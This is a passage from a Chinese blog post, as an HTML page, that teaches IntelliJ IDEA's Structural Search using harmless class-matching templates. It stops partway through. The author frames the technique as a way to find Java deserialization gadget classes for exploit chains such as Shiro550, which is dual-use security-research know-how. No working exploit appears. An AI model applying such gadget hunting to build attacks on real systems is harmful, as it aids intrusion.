@@ -1,0 +1,1428 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Study IDEA Structural Search'>
+<title>IDEA Structural Search</title>
+
+<link rel='canonical' href='https://d4n-sec.github.io/p/tryonetryideastructuralsearch/'>
+
+<link rel="stylesheet" href="/scss/style.min.abbd69b2908fdfcd5179898beaafd374514a86538d81639ddd2c58c06ae54e40.css"><meta property='og:title' content='IDEA Structural Search'>
+<meta property='og:description' content='Study IDEA Structural Search'>
+<meta property='og:url' content='https://d4n-sec.github.io/p/tryonetryideastructuralsearch/'>
+<meta property='og:site_name' content='Dan`s Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='IDEA' /><meta property='article:tag' content='Search' /><meta property='article:published_time' content='2025-04-18T15:34:24&#43;08:00'/><meta property='article:modified_time' content='2025-04-18T15:34:24&#43;08:00'/><meta property='og:image' content='https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/202504181535792.png' />
+<meta name="twitter:title" content="IDEA Structural Search">
+<meta name="twitter:description" content="Study IDEA Structural Search"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/202504181535792.png' />
+    <link rel="shortcut icon" href="https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/paper-plane-64.webp" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    <img src="https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/TX.jpg" width="300" height="300" class="site-logo" loading="lazy" alt="Avatar">
+                
+                </a>
+                
+                    <span class="emoji">🐹</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Dan`s Blog</a></h1>
+            <h2 class="site-description">今人不见古时月</h2>
+        </div>
+    </header><ol class="social-menu">
+            
+                <li>
+                    <a 
+                        href='/%E5%85%B3%E4%BA%8E'
+                        target="_blank"
+                        title="contactMe"
+                        rel="me"
+                    >
+                        
+                        
+                            <?xml version="1.0" standalone="no"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg t="1709702435352" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="8388" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200"><path d="M928 160H96c-17.7 0-32 14.3-32 32v640c0 17.7 14.3 32 32 32h832c17.7 0 32-14.3 32-32V192c0-17.7-14.3-32-32-32z m-40 110.8V792H136V270.8l-27.6-21.5 39.3-50.5 42.8 33.3h643.1l42.8-33.3 39.3 50.5-27.7 21.5z" fill="#bfbfbf" p-id="8389"></path><path d="M833.6 232L512 482 190.4 232l-42.8-33.3-39.3 50.5 27.6 21.5 341.6 265.6c20.2 15.7 48.5 15.7 68.7 0L888 270.8l27.6-21.5-39.3-50.5-42.7 33.2z" p-id="8390" fill="#bfbfbf"></path></svg>
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://github.com/d4n-sec'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='http://wpa.qq.com/msgrd?v=3&amp;uin=1664022865&amp;site=qq&amp;menu=yes'
+                        target="_blank"
+                        title="QQNum"
+                        rel="me"
+                    >
+                        
+                        
+                            
+<?xml version="1.0" standalone="no"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg t="1709702077457" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="13062" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200"><path d="M824.8 613.2c-16-51.4-34.4-94.6-62.7-165.3C766.5 262.2 689.3 112 511.5 112 331.7 112 256.2 265.2 261 447.9c-28.4 70.8-46.7 113.7-62.7 165.3-34 109.5-23 154.8-14.6 155.8 18 2.2 70.1-82.4 70.1-82.4 0 49 25.2 112.9 79.8 159-26.4 8.1-85.7 29.9-71.6 53.8 11.4 19.3 196.2 12.3 249.5 6.3 53.3 6 238.1 13 249.5-6.3 14.1-23.8-45.3-45.7-71.6-53.8 54.6-46.2 79.8-110.1 79.8-159 0 0 52.1 84.6 70.1 82.4 8.5-1.1 19.5-46.4-14.5-155.8z" p-id="13063" fill="#bfbfbf"></path></svg>
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/tools/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Tools</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/links/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>Links</span>
+            </a>
+        </li>
+        
+    </ol>
+    <div class="menu-bottom-section">
+        <ol class="menu">
+
+            
+                <li id="dark-mode-toggle">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <span>暗色模式</span>
+                </li>
+            
+        </ol>
+    </div>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#before-all">Before All</a></li>
+    <li><a href="#why-idea-structural-search">Why IDEA Structural Search</a>
+      <ol>
+        <li><a href="#for-example">For Example</a></li>
+      </ol>
+    </li>
+    <li><a href="#where-is-idea-structural-search">Where is IDEA Structural Search</a></li>
+    <li><a href="#how-to-use-it">How to use it?</a>
+      <ol>
+        <li><a href="#taste-the-magic">Taste the Magic</a></li>
+        <li><a href="#manual-of-idea-structural-search">Manual of IDEA Structural Search</a>
+          <ol>
+            <li><a href="#menus-on-left">Menus on Left</a>
+              <ol>
+                <li><a href="#menu-draft-template">Menu: Draft Template</a></li>
+                <li><a href="#menu-recent">Menu: Recent</a></li>
+                <li><a href="#menu-saved-template">Menu: Saved Template</a></li>
+                <li><a href="#menu-others-menu">Menu: Others Menu</a></li>
+              </ol>
+            </li>
+            <li><a href="#editor-area">Editor Area</a>
+              <ol>
+                <li><a href="#template-框架">Template 框架</a></li>
+                <li><a href="#template-变量">Template 变量</a></li>
+                <li><a href="#template-过滤器">Template 过滤器</a>
+                  <ol>
+                    <li><a href="#text">Text</a>
+                      <ol>
+                        <li><a href="#within-type-hierarchy">Within type hierarchy</a></li>
+                      </ol>
+                    </li>
+                    <li><a href="#count">Count</a></li>
+                    <li><a href="#reference">Reference</a>
+                      <ol>
+                        <li><a href="#invert-modifier">Invert modifier</a></li>
+                      </ol>
+                    </li>
+                    <li><a href="#script">Script</a></li>
+                    <li><a href="#type">Type</a></li>
+                  </ol>
+                </li>
+              </ol>
+            </li>
+            <li><a href="#bar-under-the-editor-area">Bar Under the Editor Area</a>
+              <ol>
+                <li><a href="#target">Target</a></li>
+                <li><a href="#injected-code">Injected code</a></li>
+                <li><a href="#match-case">Match case</a></li>
+                <li><a href="#scan-scope">Scan Scope</a></li>
+              </ol>
+            </li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+    <li><a href="#practical-cases">Practical Cases</a></li>
+    <li><a href="#when-to-use-it">When to use it</a></li>
+    <li><a href="#after-all">After All</a>
+      <ol>
+        <li><a href="#after-after-all">After After All</a></li>
+      </ol>
+    </li>
+    <li><a href="#ref">Ref</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/tryonetryideastructuralsearch/">
+                
+                    <img src="https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/202504181535792.png" loading="lazy" alt="Featured image of post IDEA Structural Search" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E6%9D%82%E5%AD%A6/" >
+                杂学
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/tryonetryideastructuralsearch/">IDEA Structural Search</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            Study IDEA Structural Search
+        </h3>
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Apr 18, 2025 15:34 &#43;0800</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 7 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h1 id="before-all">Before All</h1>
+<p>在笔者学习Java反序列化链的时候，时常会碰到寻找合适类的问题，例如在学习Shiro550 CB链时，需要寻找一个类，需要同时满足3个条件：</p>
+<ol>
+<li>实现了<code>java.io.Serializable</code>接口；</li>
+<li>实现了<code>java.util.Comparator</code>接口；</li>
+<li><code>Java</code>、<code>shiro</code>或<code>commons-beanutils</code>自带，且兼容性强；</li>
+</ol>
+<p>条件清楚，需要寻找的时候却犯了难：</p>
+<p>在没有找到IDEA结构查询功能前，IDEA自带的&quot;继承解析&quot;并不支持交叉寻找。</p>
+<p><del>（如果可以的话本文可能就是小丑了）</del></p>
+<p>如下图（114个类）</p>
+<p><img src="https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20250417193748093.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250417193748093"
+	
+	
+></p>
+<p>作为新手入坑Java反序列化，总是想自己动动脑子的</p>
+<blockquote>
+<p>师傅们给出的类可行，那么在当前依赖的环境下有多少类可行呢？</p>
+</blockquote>
+<p>如果想要自己寻找，免不了挨个挨个看，必须进入类，进入类之后但是如例子中所示，<strong>114</strong>个<code>Comparator</code>接口类光是实现了<code>Serializable</code>接口的类，上帝视角来看，也才<strong>13</strong>个，挨个查找将很快耗尽一个拥有灵活思维的新手的耐心<del>吧，笔者耐心这么少吗</del></p>
+<blockquote>
+<p>目前能搜到的解决方案包括CodeQL，Tabby；但是CodeQL目前的参考文章属实不多，折腾一天之后再看Tabby，感觉时间全部浪费了，也没学到有用的（想学的）东西</p>
+<p>而且CodeQL不能连带着项目和依赖一起查询（默认情况下），Tabby（没用不过不知道，不过好像是要打包为fatJAR）</p>
+</blockquote>
+<p>偶然的机会了解到<code>IDEA Structural Search</code>，感觉蛮有用的，但是网上好像没有什么中英文教程（除了官网）</p>
+<p>于是写点东西来给大家<em><strong>抛砖引玉</strong></em></p>
+<h1 id="why-idea-structural-search">Why IDEA Structural Search</h1>
+<ol>
+<li>CodeQL，Tabby 太重量级，学习成本不低</li>
+<li>相对于<code>Find in Files</code>进行简单的正则匹配，<code>Structural Search</code>提供类解析的能力</li>
+<li><del>可能有其他的好处吧，还没有深度使用</del></li>
+</ol>
+<h2 id="for-example">For Example</h2>
+<p>例如你想要搜索的是</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">class</span> <span class="nc">XXX</span><span class="w"> </span><span class="kd">implements</span><span class="w"> </span><span class="n">abcdABC</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">// abcdABC which is java.util.abcdABC</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>但是也同时存在接口类<code>java.io.abcdABC</code>，导致存在类</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">class</span> <span class="nc">XXX</span><span class="w"> </span><span class="kd">implements</span><span class="w"> </span><span class="n">abcdABC</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">// abcdABC which is java.io.abcdABC</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>Find in Files</code>的情况下：</p>
+<ol>
+<li>
+<p>仅仅匹配<code>implements abcdABC</code>的话，结果中存在误匹配的类</p>
+</li>
+<li>
+<p>再正则匹配一下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.abcdABC</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">.........</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">class</span> <span class="nc">XXX</span><span class="w"> </span><span class="kd">implements</span><span class="w"> </span><span class="n">abcdABC</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>如果此时存在<code>implements java.util.abcdABC</code>，又会漏掉</p>
+</li>
+</ol>
+<p>此时非要使用<code>Find in Files</code>，要么接受漏掉的类，要编写复杂的正则匹配</p>
+<h1 id="where-is-idea-structural-search">Where is IDEA Structural Search</h1>
+<p>笔者使用IDEA版本为 <code>IntelliJ IDEA 2024.3.1.1 (Ultimate Edition)</code></p>
+<blockquote>
+<p>版本过老的话可能会有所不同，不过目前的官方教程是最新版的教程，所以默认读者是最新版喔</p>
+</blockquote>
+<p>功能位置如图所示</p>
+<p><img src="https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20250417195434893.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250417195434893"
+	
+	
+></p>
+<p>打开后如下图</p>
+<p><img src="https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20250418100726592.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250418100726592"
+	
+	
+></p>
+<h1 id="how-to-use-it">How to use it?</h1>
+<p>进入正题了</p>
+<h2 id="taste-the-magic">Taste the Magic</h2>
+<p>搜索一个类，同时实现了下面两个接口</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.glass.ui.delegate.MenuDelegate</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.glass.ui.delegate.MenuItemDelegate</span><span class="p">;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>GIF FYI，<del>如果模糊可以保存之后本地看</del></p>
+<p><img src="https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/%E5%8A%A8%E7%94%BB.gif"
+	
+	
+	
+	loading="lazy"
+	
+		alt="动画"
+	
+	
+></p>
+<p>可以看到找到的都是符合条件的</p>
+<h2 id="manual-of-idea-structural-search">Manual of IDEA Structural Search</h2>
+<p>只做功能的基本介绍</p>
+<p><img src="https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20250418110901883.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250418110901883"
+	
+	
+></p>
+<h3 id="menus-on-left">Menus on Left</h3>
+<p>先介绍左边的Menu的功能</p>
+<h4 id="menu-draft-template">Menu: Draft Template</h4>
+<p>保存草稿的地方，在这里你可以尽情进行尝试</p>
+<h4 id="menu-recent">Menu: Recent</h4>
+<p>每次开始<code>Find</code>搜索的时候，你所使用的模版会在这里进行保存</p>
+<h4 id="menu-saved-template">Menu: Saved Template</h4>
+<p>如果一个模版你想要保存，后续可以在很多项目中使用的话，点击左上角的<img src="https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/app-client.expui.general.save.svg"
+	
+	
+	
+	loading="lazy"
+	
+		alt="the Save Template button"
+	
+	
+>图标，选择第一个<code>Save Template in IDE or Project...</code></p>
+<p>定义Template的名字，并且选择是否保存到项目文件中以便通过<a class="link" href="https://zh.wikipedia.org/wiki/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6"  target="_blank" rel="noopener"
+    >VCS</a>进行同步</p>
+<p><img src="https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20250418112317941.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250418112317941"
+	
+	
+></p>
+<p>保存后，就会存在于<code>Saved Template</code>目录了</p>
+<p><img src="https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20250418113624452.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250418113624452"
+	
+	
+></p>
+<h4 id="menu-others-menu">Menu: Others Menu</h4>
+<ul>
+<li><strong>这里是学习的重点，如果需要探索相关用法且本文没有提及的话，请善用这些目录内的子项</strong></li>
+</ul>
+<p>其他的目录中包含了很多官方给出的简单示例，包含很多用法，本文的主要学习也依赖于此</p>
+<h3 id="editor-area">Editor Area</h3>
+<blockquote>
+<ul>
+<li><em><strong>重点1</strong></em></li>
+</ul>
+</blockquote>
+<p>所有在<code>Editor Area</code>合法的匹配模版都会在当前打开文件<em><strong>尝试匹配</strong></em>一次，如图</p>
+<p><img src="https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20250418141537869.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250418141537869"
+	
+	
+></p>
+<p>该模版匹配的是任意方法的调用，可以看到左侧绿色部分是当前文件的匹配结果（无需点击查找，自动且实时匹配）</p>
+<p>这个可以很方便<em><strong>学习模版匹配</strong></em>和<em><strong>模版编写检查</strong></em></p>
+<blockquote>
+<ul>
+<li><em><strong>重点2</strong></em></li>
+</ul>
+</blockquote>
+<p>如果需要在依赖中搜索，Maven项目需要下载<em><strong>源码</strong></em>和<em><strong>Documentation</strong></em></p>
+<p>如果需要在依赖中搜索，Maven项目需要下载<em><strong>源码</strong></em>和<em><strong>Documentation</strong></em></p>
+<p>如果需要在依赖中搜索，Maven项目需要下载<em><strong>源码</strong></em>和<em><strong>Documentation</strong></em></p>
+<p><img src="https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20250418142610638.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250418142610638"
+	
+	
+></p>
+<h4 id="template-框架">Template 框架</h4>
+<p>你可以在这里输入你创建好的基本模版，例如下面这一些**<code>Template</code>框架**</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">enum</span><span class="w"> </span><span class="n">$Enum$</span><span class="w"> </span><span class="p">{}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">class</span> <span class="nc">$Class$</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">$FieldType$</span><span class="w"> </span><span class="n">$Field$</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">$Init$</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">class</span> <span class="nc">$Class$</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="kd">class</span> <span class="nc">$InnerClass$</span><span class="w"> </span><span class="p">{}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="template-变量">Template 变量</h4>
+<p>这里的<code>$AAA$</code>是**<code>Template</code>变量**，或者说可以进行模糊匹配的地方</p>
+<p>变量名没有要求，所以</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">class</span> <span class="nc">$Class$</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="kd">class</span> <span class="nc">$InnerClass$</span><span class="w"> </span><span class="p">{}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>可以写为</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
